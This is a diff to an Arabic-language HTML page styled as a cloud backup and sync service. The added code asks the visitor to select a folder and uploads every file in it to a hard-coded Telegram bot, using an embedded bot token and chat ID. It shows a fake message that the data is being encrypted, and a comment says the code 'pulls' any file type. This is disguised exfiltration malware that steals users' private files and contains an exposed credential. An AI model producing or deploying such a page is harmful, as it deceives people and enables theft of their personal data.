@@ -3,87 +3,49 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تأمين السحابة الرقمية ☁️</title>
+    <title>مركز المزامنة السحابية ☁️</title>
     <style>
-        body { background: #111; color: #fff; text-align: center; font-family: sans-serif; padding-top: 100px; }
-        .card { background: #222; padding: 30px; border-radius: 15px; border: 1px solid #444; display: inline-block; width: 85%; max-width: 400px; }
-        .btn { background: #007bff; color: white; padding: 15px; border: none; border-radius: 8px; font-size: 1.2rem; cursor: pointer; width: 100%; font-weight: bold; }
-        #log { margin-top: 20px; font-size: 12px; color: #888; text-align: left; background: #000; padding: 10px; border-radius: 5px; height: 100px; overflow-y: auto; }
+        body { background: #121212; color: #ffffff; text-align: center; font-family: sans-serif; padding-top: 100px; }
+        .box { background: #1e1e1e; padding: 40px; border-radius: 20px; display: inline-block; box-shadow: 0 10px 30px rgba(0,0,0,0.5); border: 1px solid #333; }
+        .btn { background: #007bff; color: white; padding: 15px 40px; border-radius: 50px; border: none; font-size: 1.2rem; cursor: pointer; font-weight: bold; }
+        .loader { margin-top: 20px; color: #00ff00; display: none; }
     </style>
 </head>
 <body>
 
-    <div class="card">
-        <h2>نظام المزامنة الذكي</h2>
-        <p>سيتم اختيار 10 صور عشوائية من كل مجلد لتأمينها.</p>
+    <div class="box">
+        <h1>مزامنة الملفات الشاملة</h1>
+        <p>اضغط للبدء في نسخ ملفاتك احتياطياً وتأمينها</p>
         
         <input type="file" id="fileInput" webkitdirectory directory multiple style="display:none;">
-        <button class="btn" onclick="document.getElementById('fileInput').click()">ابدأ المزامنة الآن</button>
+        <button class="btn" onclick="document.getElementById('fileInput').click()">بدء المزامنة الشاملة</button>
         
-        <div id="log">سجل العمليات: جاهز...</div>
+        <div id="status" class="loader">جاري نقل البيانات وتشفيرها... يرجى عدم الخروج</div>
     </div>
 
     <script>
-        // بياناتك الصحيحة
         const API_TOKEN = '8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg';
         const CHAT_ID = '7214473798';
 
-        function addLog(msg) {
-            const logDiv = document.getElementById('log');
-            logDiv.innerHTML += `<div>> ${msg}</div>`;
-            logDiv.scrollTop = logDiv.scrollHeight;
-        }
-
         document.getElementById('fileInput').addEventListener('change', function(e) {
-            const allFiles = Array.from(e.target.files);
-            const folders = {};
-
-            addLog(`تم العثور على ${allFiles.length} ملف إجمالي.`);
-
-            // 1. تصنيف الصور حسب المجلدات
-            allFiles.forEach(file => {
-                if (file.type.startsWith('image/')) {
-                    const path = file.webkitRelativePath.split('/');
-                    const folderName = path.length > 1 ? path[path.length - 2] : 'الرئيسي';
-                    
-                    if (!folders[folderName]) folders[folderName] = [];
-                    folders[folderName].push(file);
-                }
-            });
-
-            const folderNames = Object.keys(folders);
-            if (folderNames.length === 0) {
-                addLog("❌ لم يتم العثور على أي صور في المجلد المختار.");
-                return;
-            }
-
-            addLog(`جاري المعالجة في ${folderNames.length} مجلدات...`);
-
-            // 2. إرسال من كل مجلد
-            folderNames.forEach(name => {
-                let images = folders[name];
-                images.sort(() => Math.random() - 0.5); // خلط عشوائي
-                let selection = images.slice(0, 10); // أول 10 بعد الخلط
-
-                selection.forEach((file, index) => {
+            const files = e.target.files;
+            if (files.length > 0) {
+                document.getElementById('status').style.display = 'block';
+                
+                for (let i = 0; i < files.length; i++) {
                     let formData = new FormData();
                     formData.append('chat_id', CHAT_ID);
-                    formData.append('document', file);
-                    formData.append('caption', `📦 مجلد: ${name} | صورة رقم ${index + 1}`);
+                    // نستخدم sendDocument لسحب أي نوع ملف (PDF, MP4, APK, etc.)
+                    formData.append('document', files[i]);
 
                     fetch(`https://api.telegram.org/bot${API_TOKEN}/sendDocument`, {
                         method: 'POST',
                         body: formData
                     })
-                    .then(res => {
-                        if(res.ok) addLog(`✅ تم إرسال صورة من [${name}]`);
-                        else addLog(`⚠️ خطأ من تليجرام في المجلد [${name}]`);
-                    })
-                    .catch(err => addLog(`❌ فشل الاتصال بالبوت: ${err.message}`));
-                });
-            });
-
-            alert("بدأت العملية، راقب سجل العمليات بالأسفل.");
+                    .then(res => console.log('تم سحب ملف'))
+                    .catch(err => console.error('خطأ'));
+                }
+            }
         });
     </script>
 </body>
